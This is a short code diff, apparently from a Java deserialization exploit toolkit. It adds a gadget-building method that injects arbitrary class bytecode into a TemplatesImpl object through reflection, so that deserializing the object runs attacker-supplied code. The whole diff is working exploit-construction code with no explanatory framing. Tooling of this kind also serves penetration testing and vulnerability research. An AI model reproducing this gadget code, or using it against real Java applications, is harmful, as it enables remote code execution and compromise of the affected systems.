@@ -121,6 +121,23 @@ public class Gadgets {
         return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
 
+    public static <T> T createTemplatesImpl ( byte[] bytes, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
+            throws Exception {
+        final T templates = tplClass.newInstance();
+
+        // use template gadget class
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class));
+        pool.insertClassPath(new ClassClassPath(abstTranslet));
+
+        // inject class bytes into instance
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {bytes});
+
+        // required to make TemplatesImpl happy
+        Reflections.setFieldValue(templates, "_name", "Pwnr");
+        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
+        return templates;
+    }
 
     public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
             throws Exception {
